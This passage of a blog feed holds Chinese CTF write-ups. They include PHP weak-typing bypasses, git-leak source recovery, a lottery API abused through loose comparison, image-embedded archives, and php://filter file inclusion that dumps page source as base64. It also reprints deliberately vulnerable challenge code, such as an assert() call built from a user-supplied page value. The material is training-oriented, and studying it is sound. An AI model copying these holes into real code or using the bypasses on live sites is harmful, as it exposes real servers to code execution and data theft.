variable">$b</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">and</span> <span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">print</span> <span class="token string">"work harder!harder!harder!"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>现在就可以开始一段一段分析了</p><p>if(!$_GET[‘id’])<br>{<br>    header(‘Location: index.php?id=1’);<br>    exit();<br>}</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>出misc题的一些总结</title>
      <link href="/2019/11/12/chu-misc-ti-de-yi-xie-zong-jie/"/>
      <url>/2019/11/12/chu-misc-ti-de-yi-xie-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>首先用zip进行压缩，zip与rar格式的压缩有很大的不同</p><p>主要是zip压缩的量比rar多多了</p><p>接下来主要是怎么将文件藏入图片中呢?</p><p> 新建一个文本文件（txt），然后打开，写入代码“copy/b 图片名称.jpg+压缩包名称.rar 生成文件名”</p><p>这样文件就被放进另外一个文件里面</p><p>目前接触到的就是讲文件从图片或者音乐里面分离出来，一般用binwalk检查然后用foremost分离出来，因为这次是给大一出的题目，就没有出的特别难….</p><p>就先记录这么多，以后有空的话就更新</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业题wp</title>
      <link href="/2019/11/02/zuo-ye-ti-wp/"/>
      <url>/2019/11/02/zuo-ye-ti-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="最后一次作业wp"><a href="#最后一次作业wp" class="headerlink" title="最后一次作业wp"></a>最后一次作业wp</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$c</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token keyword">echo</span> <span class="token variable">$flag1</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">></span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token keyword">echo</span> <span class="token variable">$flag2</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>    <span class="token keyword">echo</span> <span class="token variable">$flag3</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span><span class="token delimiter">?></span></code></pre><p>五个判断</p><p>第一个判断，a 变量需要弱等于 0 ，并且 a 不等于 0。<br>第二个判断和第三个判断，b 不为数字并且 b 需要大于 1234。<br>第四个判断，c 变量不为数字。<br>第五个判断，c 只能为纯数字或者纯字母或者混合字符串。</p><p>绕过）</p><p>对于 a，由于字符串类型和整数类型弱比较时会先转换为相同的类型，纯字母字符串转换为 0；同时 a 也不是 null 或者 flase。a 等于 abc 绕过。<br>对于 b，和 a 基本相同，这里不同的是 数字开头的字符串会转换为对应的数字。b 等于12345abc 绕过。<br>c，由于不能是数字，所以等于纯字母或者混合字符串即可。（其实这里无论输入什么都可以回显，没有设置考点）</p><h3 id="遇见，遇见你"><a href="#遇见，遇见你" class="headerlink" title="遇见，遇见你"></a>遇见，遇见你</h3><p>用御剑扫到 shell.php，之后 intruder 爆破。</p><h3 id="100年后的flag"><a href="#100年后的flag" class="headerlink" title="100年后的flag"></a>100年后的flag</h3><p>发现提示说需要ios119，抓包，上网寻找ios版本信息 ，更改版本为iPhone </p><p><img src="1.PNG"></p><p>发现需要Safari浏览器，添加Safari浏览器信息，得到flag</p><p><img src="2.PNG"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>​                                        上面就有</p><h3 id="签到小法"><a href="#签到小法" class="headerlink" title="签到小法"></a>签到小法</h3><p>​                                   notifactions</p><h3 id="只因你太美哦噢"><a href="#只因你太美哦噢" class="headerlink" title="只因你太美哦噢"></a>只因你太美哦噢</h3><p>​                         you are sobeautiful里-&gt;base64解码</p><h3 id="愤怒的鲲鲲"><a href="#愤怒的鲲鲲" class="headerlink" title="愤怒的鲲鲲"></a>愤怒的鲲鲲</h3><p>​                                    修改宽499-&gt;500</p><h3 id="表情包一览"><a href="#表情包一览" class="headerlink" title="表情包一览"></a>表情包一览</h3><p>​            aaencode-》社会主义核心价值观-》HEX-》base64</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="看看你的手在哪里"><a href="#看看你的手在哪里" class="headerlink" title="看看你的手在哪里"></a>看看你的手在哪里</h3><p>看到base64，直接解码得到GWHT{yhji_qwsxz edft wsdr _ygbnju zxswq xdfv ijmlo}    根据提示开个小脑洞想到键盘密码</p><h3 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h3><p>​               base64<em>2-&gt;base16</em>3-&gt;base32<em>3-&gt;base64</em>2</p><h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p>​         两次栅栏（每组字数为4）-&gt;rot13-&gt;凯撒密码（23）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界的几道小题</title>
      <link href="/2019/10/15/gong-fang-shi-jie-de-ji-dao-xiao-ti/"/>
      <url>/2019/10/15/gong-fang-shi-jie-de-ji-dao-xiao-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="【write-up】攻防世界的几道小题"><a href="#【write-up】攻防世界的几道小题" class="headerlink" title="【write up】攻防世界的几道小题"></a>【write up】攻防世界的几道小题</h1><p>emmm最近开始刷题后，发现很多题可以自己做出来，并不是很难，写一下记录一下吧</p><h2 id="第一题-Training-WWW-Robots"><a href="#第一题-Training-WWW-Robots" class="headerlink" title="第一题 Training-WWW-Robots"></a>第一题 Training-WWW-Robots</h2><h2 id="本题考察知识点"><a href="#本题考察知识点" class="headerlink" title="本题考察知识点"></a>本题考察知识点</h2><p>robots.txt–robots.txt</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><blockquote><p>robots.txt文件是一个<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC">文本</a>文件，使用<a href="https://baike.baidu.com/item/%E4%BB%BB%E4%BD%95">任何</a>一个常见的<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91">文本编辑</a>器，比如<a href="https://baike.baidu.com/item/Windows">Windows</a>系统自带的Notepad，就可以创建和编辑它[1] 。<a href="https://baike.baidu.com/item/robot">robot</a>s.txt是一个协议，而不是一个<a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4">命令</a>。robots.txt是<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a>中访问网站的时候要查看的第一个文件。robots.txt文件告诉<a href="https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B%E7%A8%8B%E5%BA%8F">蜘蛛程序</a>在服务器上什么文件是可以被查看的。</p><p>当一个搜索蜘蛛访问一个<a href="https://baike.baidu.com/item/%E7%AB%99%E7%82%B9">站点</a>时，它会首先<a href="https://baike.baidu.com/item/%E6%A3%80%E6%9F%A5">检查</a>该站点<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95">根目录</a>下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%94%B6%E5%BD%95">搜索引擎收录</a>的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p><p>如果将<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99">网站</a>视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“<a href="https://baike.baidu.com/item/%E8%AF%B7%E5%8B%BF%E6%89%93%E6%89%B0">请勿打扰</a>”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是<a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4">命令</a>，也不是<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>，如同守门人无法阻止窃贼等恶意闯入者。</p><p>—来源百度百科</p></blockquote><p>进入网页后，出现了下图</p><p><img src="1.PNG"></p><p>阅读后发现可以利用robots.txt</p><p>接着构造payload:/robots.txt</p><p>后出现答案</p><p>本题主要是考察了robots.txt的运用和英语基础</p><h2 id="第二题–lottory"><a href="#第二题–lottory" class="headerlink" title="第二题–lottory"></a>第二题–lottory</h2><h2 id="本题考察知识点-1"><a href="#本题考察知识点-1" class="headerlink" title="本题考察知识点"></a>本题考察知识点</h2><ol><li><p>githack扫描   即git泄露</p></li><li><p>代码审计  PHP弱类型比较</p></li></ol><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>首先进入题目注册、购买几次后…发现啥都搞不了，于是用githack尝试扫描，拿下源码进行审计。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$money</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'money'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$numbers</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$win_numbers</span> <span class="token operator">=</span> <span class="token function">random_win_nums</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$same_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;      </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$numbers</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$win_numbers</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;         </span>        <span class="token variable">$same_count</span><span class="token operator">++</span><span class="token punctuation">;</span>          <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;   </span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;   </span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$same_count</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;      </span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">1800</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">200000</span><span class="token punctuation">;</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">5000000</span><span class="token punctuation">;</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">default</span><span class="token punctuation">:</span>                 <span class="token variable">$prize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span><span class="token variable">$money</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token variable">$prize</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'money'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$money</span><span class="token punctuation">;</span>   <span class="token function">response</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'ok'</span><span class="token punctuation">,</span><span class="token string">'numbers'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$numbers</span><span class="token punctuation">,</span> <span class="token string">'win_numbers'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$win_numbers</span><span class="token punctuation">,</span> <span class="token string">'money'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$money</span><span class="token punctuation">,</span> <span class="token string">'prize'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$prize</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>接着发现$numbers[$i] == $win_numbers[$i]</p><p>弱类型进行比较</p><p>接着尝试抓包，</p><p><img src="3.PNG">（其实我的做法是githack之后，进行抓包后，发现是api.php，于是重点审计api.php的源码）</p><p>后面就抓包修改’true’即可得到</p><p>第一次是50000，第二次是50000，第三次是20000，得到的money会一次递减。</p><p><img src="4.PNG"></p><p>就这样Ok啦！</p><h2 id="第三题-NewsCenter"><a href="#第三题-NewsCenter" class="headerlink" title="第三题 NewsCenter"></a>第三题 NewsCenter</h2><p>本题网站被破了，输啥都有答案，过</p><h2 id="第四题-mfw"><a href="#第四题-mfw" class="headerlink" title="第四题  mfw"></a>第四题  mfw</h2><h2 id="本题考察知识点-2"><a href="#本题考察知识点-2" class="headerlink" title="本题考察知识点"></a>本题考察知识点</h2><p>git泄露</p><p>dirsearch与githack的配合使用</p><p>代码审计</p><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string">"home"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"templates/"</span> <span class="token punctuation">.</span> <span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">".php"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// I heard '..' is dangerous!。assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</span><span class="token comment" spellcheck="true">// TODO: Make this look nice</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"file_exists('$file')"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"That file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><a href="https://blog.csdn.net/wyj_1216/article/details/95218671">https://blog.csdn.net/wyj_1216/article/details/95218671</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【write up】攻防世界-Web-ics-05</title>
      <link href="/2019/10/11/write-up-gong-fang-shi-jie-web-ics-05/"/>
      <url>/2019/10/11/write-up-gong-fang-shi-jie-web-ics-05/</url>
      
        <content type="html"><![CDATA[<h1 id="【write-up】攻防世界-Web-ics-05"><a href="#【write-up】攻防世界-Web-ics-05" class="headerlink" title="【write up】攻防世界-Web-ics-05"></a>【write up】攻防世界-Web-ics-05</h1><p>某菜鸡被大佬拉过来暴“锤”了一顿后才有了这篇</p><h2 id="本题考察知识点"><a href="#本题考察知识点" class="headerlink" title="本题考察知识点"></a>本题考察知识点</h2><p>文件包含漏洞</p><p>PHP伪协议中的<strong>php://filter</strong></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>1.发现只有维护中心链接可以进入</p><p><img src="0.PNG"></p><p>接着可以查看源代码</p><p><img src="0.5.PNG"></p><p>接着可以看到url发生了变化</p><p><img src="0.75.PNG"></p><p>接着可以发现界面出现了index，那么尝试修改page值，发现居然显示的界面发生了改变，那么就可以尝试一波文件包含读源码的漏洞哇！</p><p><img src="1.PNG"></p><p>骚操作了一波之后，解得源码：</p><blockquote><p>PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKQHNlc3Npb25fc3RhcnQoKTsKcG9zaXhfc2V0dWlkKDEwMDApOwoKCj8+CjwhRE9DVFlQRSBIVE1MPgo8aHRtbD4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPG1ldGEgbmFtZT0icmVuZGVyZXIiIGNvbnRlbnQ9IndlYmtpdCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UsY2hyb21lPTEiPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLCBtYXhpbXVtLXNjYWxlPTEiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJsYXl1aS9jc3MvbGF5dWkuY3NzIiBtZWRpYT0iYWxsIj4KICAgIDx0aXRsZT7orr7lpIfnu7TmiqTkuK3lv4M8L3RpdGxlPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDx1bCBjbGFzcz0ibGF5dWktbmF2Ij4KICAgICAgICA8bGkgY2xhc3M9ImxheXVpLW5hdi1pdGVtIGxheXVpLXRoaXMiPjxhIGhyZWY9Ij9wYWdlPWluZGV4Ij7kupHlubPlj7Dorr7lpIfnu7TmiqTkuK3lv4M8L2E+PC9saT4KICAgIDwvdWw+CiAgICA8ZmllbGRzZXQgY2xhc3M9ImxheXVpLWVsZW0tZmllbGQgbGF5dWktZmllbGQtdGl0bGUiIHN0eWxlPSJtYXJnaW4tdG9wOiAzMHB4OyI+CiAgICAgICAgPGxlZ2VuZD7orr7lpIfliJfooag8L2xlZ2VuZD4KICAgIDwvZmllbGRzZXQ+CiAgICA8dGFibGUgY2xhc3M9ImxheXVpLWhpZGUiIGlkPSJ0ZXN0Ij48L3RhYmxlPgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2h0bWwiIGlkPSJzd2l0Y2hUcGwiPgogICAgICAgIDwhLS0g6L+Z6YeM55qEIGNoZWNrZWQg55qE54q25oCB5Y+q5piv5ryU56S6IC0tPgogICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ic2V4IiB2YWx1ZT0ie3tkLmlkfX0iIGxheS1za2luPSJzd2l0Y2giIGxheS10ZXh0PSLlvIB85YWzIiBsYXktZmlsdGVyPSJjaGVja0RlbW8iIHt7IGQuaWQ9PTEgMDAwMyA/ICdjaGVja2VkJyA6ICcnIH19PgogICAgPC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0ibGF5dWkvbGF5dWkuanMiIGNoYXJzZXQ9InV0Zi04Ij48L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICBsYXl1aS51c2UoJ3RhYmxlJywgZnVuY3Rpb24oKSB7CiAgICAgICAgdmFyIHRhYmxlID0gbGF5dWkudGFibGUsCiAgICAgICAgICAgIGZvcm0gPSBsYXl1aS5mb3JtOwoKICAgICAgICB0YWJsZS5yZW5kZXIoewogICAgICAgICAgICBlbGVtOiAnI3Rlc3QnLAogICAgICAgICAgICB1cmw6ICcvc29tcnRoaW5nLmpzb24nLAogICAgICAgICAgICBjZWxsTWluV2lkdGg6IDgwLAogICAgICAgICAgICBjb2xzOiBbCiAgICAgICAgICAgICAgICBbCiAgICAgICAgICAgICAgICAgICAgeyB0eXBlOiAnbnVtYmVycycgfSwKICAgICAgICAgICAgICAgICAgICAgeyB0eXBlOiAnY2hlY2tib3gnIH0sCiAgICAgICAgICAgICAgICAgICAgIHsgZmllbGQ6ICdpZCcsIHRpdGxlOiAnSUQnLCB3aWR0aDogMTAwLCB1bnJlc2l6ZTogdHJ1ZSwgc29ydDogdHJ1ZSB9LAogICAgICAgICAgICAgICAgICAgICB7IGZpZWxkOiAnbmFtZScsIHRpdGxlOiAn6K6+5aSH5ZCNJywgdGVtcGxldDogJyNuYW1lVHBsJyB9LAogICAgICAgICAgICAgICAgICAgICB7IGZpZWxkOiAnYXJlYScsIHRpdGxlOiAn5Yy65Z+fJyB9LAogICAgICAgICAgICAgICAgICAgICB7IGZpZWxkOiAnc3RhdHVzJywgdGl0bGU6ICfnu7TmiqTnirbmgIEnLCBtaW5XaWR0aDogMTIwLCBzb3J0OiB0cnVlIH0sCiAgICAgICAgICAgICAgICAgICAgIHsgZmllbGQ6ICdjaGVjaycsIHRpdGxlOiAn6K6+5aSH5byA5YWzJywgd2lkdGg6IDg1LCB0ZW1wbGV0OiAnI3N3aXRjaFRwbCcsIHVucmVzaXplOiB0cnVlIH0KICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgcGFnZTogdHJ1ZQogICAgICAgIH0pOwogICAgfSk7CiAgICA8L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICBsYXl1aS51c2UoJ2VsZW1lbnQnLCBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgZWxlbWVudCA9IGxheXVpLmVsZW1lbnQ7IC8v5a+86Iiq55qEaG92ZXLmlYjmnpzjgIHkuoznuqfoj5zljZXnrYnlip/og73vvIzpnIDopoHkvp3otZZlbGVtZW505qih5Z2XCiAgICAgICAgLy/nm5HlkKzlr7zoiKrngrnlh7sKICAgICAgICBlbGVtZW50Lm9uKCduYXYoZGVtbyknLCBmdW5jdGlvbihlbGVtKSB7CiAgICAgICAgICAgIC8vY29uc29sZS5sb2coZWxlbSkKICAgICAgICAgICAgbGF5ZXIubXNnKGVsZW0udGV4dCgpKTsKICAgICAgICB9KTsKICAgIH0pOwogICAgPC9zY3JpcHQ+Cgo8P3BocAoKJHBhZ2UgPSAkX0dFVFtwYWdlXTsKCmlmIChpc3NldCgkcGFnZSkpIHsKCgoKaWYgKGN0eXBlX2FsbnVtKCRwYWdlKSkgewo/PgoKICAgIDxiciAvPjxiciAvPjxiciAvPjxiciAvPgogICAgPGRpdiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj48P3BocCBlY2hvICRwYWdlOyBka